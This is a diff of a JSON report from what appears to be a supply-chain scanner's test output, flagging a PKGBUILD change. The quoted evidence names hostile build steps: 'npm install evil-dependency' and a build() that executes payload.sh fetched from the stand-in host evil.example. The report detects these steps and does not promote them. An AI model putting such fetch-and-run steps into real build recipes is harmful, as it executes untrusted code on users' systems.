@@ -53,7 +53,7 @@
   },
   "status": "fail_closed_catch",
   "trustsight": {
-    "config_fingerprint": "sha256:a7ea7dd7b35fe11d3af1c1756daa07d552b56a787be1d43e71d141bd73c56a00",
+    "config_fingerprint": "sha256:438329bd2d922888b6701a07c20434310be8ced651c7c180b2a5c505d657ac0c",
     "diff_shape_fp": "sha256:9d58ccd3ddccbefd",
     "observed_layers": {
       "fired": [
@@ -104,6 +104,9 @@
       ],
       "cached": false,
       "cached_at": "",
+      "campaign_hold": false,
+      "campaign_id": "",
+      "campaign_state": "none",
       "change": {
         "added_dependencies": {
           "checkdepends": [],
@@ -207,7 +210,7 @@
       ],
       "cofire_health": [],
       "comparison_base": "recorded",
-      "config_fingerprint": "sha256:a7ea7dd7b35fe11d3af1c1756daa07d552b56a787be1d43e71d141bd73c56a00",
+      "config_fingerprint": "sha256:438329bd2d922888b6701a07c20434310be8ced651c7c180b2a5c505d657ac0c",
       "contacts": {
         "available": true,
         "note": "",
@@ -239,6 +242,7 @@
       ],
       "findings": [
         {
+          "cwe": "CWE-506",
           "description": "Package Manager Runs Fetched Code At Build Time: package manager runs fetched code: npm install evil-dependency [X011]",
           "evidence": {
             "body": "npm install evil-dependency",
@@ -247,6 +251,7 @@
           },
           "file": "PKGBUILD",
           "line": 14,
+          "remediation": "Remove the environment or refusal manipulation; the build must not attack its own tooling.",
           "rule_id": "X011",
           "rule_uid": "TS-0242",
           "severity": "HIGH",
@@ -256,6 +261,7 @@
           "template": "Package Manager Runs Fetched Code At Build Time: {match}"
         },
         {
+          "cwe": "CWE-693",
           "description": "upstream content declared at https://github.com/example/harness-baseline was not read (A2: the analysis reads declarations, never upstream itself) [W011]",
           "evidence": {
             "match": "upstream content declared at https://github.com/example/harness-baseline was not read (A2: the analysis reads declarations, never upstream itself)",
@@ -264,6 +270,7 @@
           },
           "file": "PKGBUILD",
           "line": null,
+          "remediation": "Provide a readable, checksum-pinned form the analysis can inspect; treat the unread surface as unverified.",
           "rule_id": "W011",
           "rule_uid": "TS-0271",
           "severity": "INFO",
@@ -271,6 +278,7 @@
           "template": "{match}"
         },
         {
+          "cwe": "CWE-693",
           "description": "the upstream_repo federation channel holds no data for github.com/example/harness-baseline; U007/U008 could not be checked [W012]",
           "evidence": {
             "match": "the upstream_repo federation channel holds no data for github.com/example/harness-baseline; U007/U008 could not be checked",
@@ -278,6 +286,7 @@
           },
           "file": "PKGBUILD",
           "line": null,
+          "remediation": "Provide a readable, checksum-pinned form the analysis can inspect; treat the unread surface as unverified.",
           "rule_id": "W012",
           "rule_uid": "TS-0272",
           "severity": "INFO",
@@ -285,6 +294,7 @@
           "template": "{match}"
         },
         {
+          "cwe": "CWE-94",
           "description": "Downloaded Source File Executed: build() executes declared source file payload.sh [H083]",
           "evidence": {
             "match": "build() executes declared source file payload.sh",
@@ -293,6 +303,7 @@
           },
           "file": "PKGBUILD",
           "line": 15,
+          "remediation": "Do not pipe or execute fetched content in the build; vendor it or pin and verify a checked source.",
           "rule_id": "H083",
           "rule_uid": "TS-0139",
           "severity": "HIGH",
@@ -300,6 +311,7 @@
           "template": "Downloaded Source File Executed: {match}"
         },
         {
+          "cwe": "CWE-693",
           "description": "Build Resolves Dependencies From A Registry: build runs npm install evil-dependency, so a registry chooses at build time which code runs; no checksum here covers it; no committed npm manifest names that surface [W002]",
           "evidence": {
             "command": "npm install evil-dependency",
@@ -309,6 +321,7 @@
           },
           "file": "PKGBUILD",
           "line": 14,
+          "remediation": "Provide a readable, checksum-pinned form the analysis can inspect; treat the unread surface as unverified.",
           "rule_id": "W002",
           "rule_uid": "TS-0223",
           "severity": "INFO",
@@ -316,6 +329,7 @@
           "template": "Build Resolves Dependencies From A Registry: {match}"
         },
         {
+          "cwe": "CWE-506",
           "description": "rule hits span 3 distinct kill-chain stages: payload, registry, write_then_exec [H043]",
           "evidence": {
             "match": "rule hits span 3 distinct kill-chain stages: payload, registry, write_then_exec",
@@ -324,6 +338,7 @@
           },
           "file": "",
           "line": null,
+          "remediation": "Split the change so each step can be reviewed, or explain why the signals co-occur.",
           "rule_id": "H043",
           "rule_uid": "TS-0099",
           "severity": "INFO",
@@ -331,10 +346,12 @@
           "template": "rule hits span {n_stages} distinct kill-chain stages: {stages}"
         },
         {
+          "cwe": "",
           "description": "Source URL classified as unknown (https://evil.example/payload.sh) [SOURCE_BUCKET]",
           "evidence": {},
           "file": "",
           "line": null,
+          "remediation": "",
           "rule_id": "SOURCE_BUCKET",
           "rule_uid": null,
           "severity": "MEDIUM",
@@ -454,6 +471,7 @@
       "score": 70,
       "score_breakdown": [
         {
+          "cwe": "CWE-506",
           "evidence": {
             "match": "a build tool caches outside $srcdir without an overridden cache directory"
           },
@@ -462,6 +480,7 @@
           "line": null,
           "params": {},
           "reason": "Build Cache Outside The Build Trees: a build tool caches outside $srcdir without an overridden cache directory",
+          "remediation": "Remove host probing and staging from the build; it is not needed to produce the package.",
           "rule_id": "C028",
           "severity": "INFO",
           "techniques": [],
@@ -469,6 +488,7 @@
           "weight": 0
         },
         {
+          "cwe": "CWE-506",
           "evidence": {
             "body": "npm install evil-dependency",
             "match": "package manager runs fetched code: npm install evil-dependency",
@@ -482,6 +502,7 @@
             "shape": "package manager runs fetched code"
           },
           "reason": "Package Manager Runs Fetched Code At Build Time: package manager runs fetched code: npm install evil-dependency",
+          "remediation": "Remove the environment or refusal manipulation; the build must not attack its own tooling.",
           "rule_id": "X011",
           "severity": "HIGH",
           "techniques": [
@@ -491,6 +512,7 @@
           "weight": 25
         },
         {
+          "cwe": "CWE-693",
           "evidence": {
             "match": "upstream content declared at https://github.com/example/harness-baseline was not read (A2: the analysis reads declarations, never upstream itself)",
             "upstream_repo": "github.com/example/harness-baseline",
@@ -504,6 +526,7 @@
             "url": "https://github.com/example/harness-baseline"
           },
           "reason": "Upstream Content Not Read: upstream content declared at https://github.com/example/harness-baseline was not read (A2: the analysis reads declarations, never upstream itself)",
+          "remediation": "Provide a readable, checksum-pinned form the analysis can inspect; treat the unread surface as unverified.",
           "rule_id": "W011",
           "severity": "INFO",
           "techniques": [],
@@ -511,6 +534,7 @@
           "weight": 0
         },
         {
+          "cwe": "CWE-693",
           "evidence": {
             "match": "the upstream_repo federation channel holds no data for github.com/example/harness-baseline; U007/U008 could not be checked",
             "upstream_repo": "github.com/example/harness-baseline"
@@ -522,6 +546,7 @@
             "upstream_repo": "github.com/example/harness-baseline"
           },
           "reason": "Federation Not Consulted: the upstream_repo federation channel holds no data for github.com/example/harness-baseline; U007/U008 could not be checked",
+          "remediation": "Provide a readable, checksum-pinned form the analysis can inspect; treat the unread surface as unverified.",
           "rule_id": "W012",
           "severity": "INFO",
           "techniques": [],
@@ -529,6 +554,7 @@
           "weight": 0
         },
         {
+          "cwe": "CWE-94",
           "evidence": {
             "match": "diff modifies build()",
             "touched": "build"
@@ -540,6 +566,7 @@
             "touched": "build"
           },
           "reason": "Critical Build Function Modified: diff modifies build()",
+          "remediation": "Do not pipe or execute fetched content in the build; vendor it or pin and verify a checked source.",
           "rule_id": "H015",
           "severity": "INFO",
           "techniques": [],
@@ -547,6 +574,7 @@
           "weight": 0
         },
         {
+          "cwe": "CWE-94",
           "evidence": {
             "match": "build() executes declared source file payload.sh",
             "path": "payload.sh",
@@ -560,6 +588,7 @@
             "position": "build"
           },
           "reason": "Downloaded Source File Executed: build() executes declared source file payload.sh",
+          "remediation": "Do not pipe or execute fetched content in the build; vendor it or pin and verify a checked source.",
           "rule_id": "H083",
           "severity": "HIGH",
           "techniques": [],
@@ -567,6 +596,7 @@
           "weight": 25
         },
         {
+          "cwe": "CWE-693",
           "evidence": {
             "command": "npm install evil-dependency",
             "count": 1,
@@ -582,6 +612,7 @@
             "position": "build"
           },
           "reason": "Build Resolves Dependencies From A Registry: build runs npm install evil-dependency, so a registry chooses at build time which code runs; no checksum here covers it; no committed npm manifest names that surface",
+          "remediation": "Provide a readable, checksum-pinned form the analysis can inspect; treat the unread surface as unverified.",
           "rule_id": "W002",
           "severity": "INFO",
           "techniques": [],
@@ -589,6 +620,7 @@
           "weight": 0
         },
         {
+          "cwe": "CWE-506",
           "evidence": {
             "match": "rule hits span 5 distinct capability categories",
             "n_categories": 5
@@ -600,6 +632,7 @@
             "n_categories": 5
           },
           "reason": "Capability Density Anomaly: rule hits span 5 distinct capability categories",
+          "remediation": "Split the change so each step can be reviewed, or explain why the signals co-occur.",
           "rule_id": "H027",
           "severity": "INFO",
           "techniques": [],
@@ -607,6 +640,7 @@
           "weight": 0
         },
         {
+          "cwe": "CWE-506",
           "evidence": {
             "match": "rule hits span 3 distinct kill-chain stages: payload, registry, write_then_exec",
             "n_stages": 3,
@@ -620,6 +654,7 @@
             "stages": "payload, registry, write_then_exec"
           },
           "reason": "Attack-Chain Composition: rule hits span 3 distinct kill-chain stages: payload, registry, write_then_exec",
+          "remediation": "Split the change so each step can be reviewed, or explain why the signals co-occur.",
           "rule_id": "H043",
           "severity": "INFO",
           "techniques": [],
@@ -627,6 +662,7 @@
           "weight": 0
         },
         {
+          "cwe": "",
           "evidence": {
             "gap": "tree_not_analyzed"
           },
@@ -637,6 +673,7 @@
             "gap": "tree_not_analyzed"
           },
           "reason": "Coverage gap: the repository file manifest was unavailable, so only the PKGBUILD was examined",
+          "remediation": "",
           "rule_id": "COVERAGE",
           "severity": "INFO",
           "techniques": [],
@@ -644,6 +681,7 @@
           "weight": 0
         },
         {
+          "cwe": "",
           "evidence": {
             "gap": "unpinned_build_deps"
           },
@@ -654,6 +692,7 @@
             "gap": "unpinned_build_deps"
           },
           "reason": "Coverage gap: a build step resolves dependencies from a package registry, so the code the build will fetch and execute is not in the analysed text and no checksum in this recipe covers it",
+          "remediation": "",
           "rule_id": "COVERAGE",
           "severity": "INFO",
           "techniques": [],
@@ -661,12 +700,14 @@
           "weight": 0
         },
         {
+          "cwe": "",
           "evidence": {},
           "file": "",
           "licensed_by": [],
           "line": null,
           "params": {},
           "reason": "Source URL classified as unknown (https://evil.example/payload.sh)",
+          "remediation": "",
           "rule_id": "SOURCE_BUCKET",
           "severity": "MEDIUM",
           "techniques": [],
@@ -674,12 +715,14 @@
           "weight": 20
         },
         {
+          "cwe": "",
           "evidence": {},
           "file": "",
           "licensed_by": [],
           "line": null,
           "params": {},
           "reason": "checksums declared for all non-VCS sources",
+          "remediation": "",
           "rule_id": "P001",
           "severity": "INFO",
           "techniques": [],
@@ -687,14 +730,103 @@
           "weight": 0
         }
       ],
+      "self_state": {
+        "blind": [
+          "federation_unavailable",
+          "ioc_never_pulled",
+          "watchlist_never_pulled"
+        ],
+        "campaign_state": "none",
+        "channels": {
+          "baseline": {
+            "age_observations": null,
+            "channel": "emiliano-go/trustsight",
+            "tag": "baseline-2026-10-22"
+          },
+          "ioc": {
+            "age_observations": null,
+            "channel": "",
+            "tag": null
+          },
+          "watchlist": {
+            "age_observations": null,
+            "channel": "",
+            "tag": null
+          }
+        },
+        "contacts_available": true,
+        "effective_observations": 0,
+        "federation_available": false,
+        "instrument": {
+          "config_fingerprint": "sha256:438329bd2d922888b6701a07c20434310be8ced651c7c180b2a5c505d657ac0c"
+        },
+        "mode": "cold",
+        "observation_seq": 0,
+        "ruleset": {
+          "age_drift": false,
+          "local_version": 18,
+          "shipped_version": 18
+        },
+        "seed_observations": 0,
+        "tender_point_state": "unavailable"
+      },
       "suppressed_rules": [],
+      "tag_panel": [
+        {
+          "count": 1,
+          "events": [
+            {
+              "kind": "contact",
+              "source_rule": "host",
+              "value": "evil.example",
+              "weight": 0
+            }
+          ],
+          "kind": "contact"
+        },
+        {
+          "count": 4,
+          "events": [
+            {
+              "kind": "annotation",
+              "source_rule": "P001",
+              "value": "P001",
+              "weight": 0
+            },
+            {
+              "kind": "annotation",
+              "source_rule": "W002",
+              "value": "W002",
+              "weight": 0
+            },
+            {
+              "kind": "annotation",
+              "source_rule": "W012",
+              "value": "W012",
+              "weight": 0
+            },
+            {
+              "kind": "annotation",
+              "source_rule": "W011",
+              "value": "https://github.com/example/harness-baseline",
+              "weight": 0
+            }
+          ],
+          "kind": "annotation"
+        }
+      ],
+      "tender_point": {
+        "months": 6,
+        "state": "unavailable",
+        "unresolved": 0
+      },
       "unresolved_assignments": [],
       "verdict": "This analysis was incomplete: the repository file manifest was unavailable, so only the PKGBUILD was examined, and a build step resolves dependencies from a package registry, so the code the build will fetch and execute is not in the analysed text and no checksum in this recipe covers it. The result describes what was examined, not the whole change. Version unchanged. modified PKGBUILD; added 1 source URL(s). Signals: Package Manager Runs Fetched Code At Build Time: package manager runs fetched code: npm install evil-dependency [X011]; Downloaded Source File Executed: build() executes declared source file payload.sh [H083]; Source URL classified as unknown (https://evil.example/payload.sh) [SOURCE_BUCKET]. Evidence categories fired: L4 (Evasion shape), L5 (Behavioral suspicion). Review the diff before building.",
-      "version_comparison": ""
+      "version_comparison": null
     },
     "techniques": [
       "X011:package manager runs fetched code"
     ],
-    "wall_clock_ms": 39
+    "wall_clock_ms": 136
   }
 }
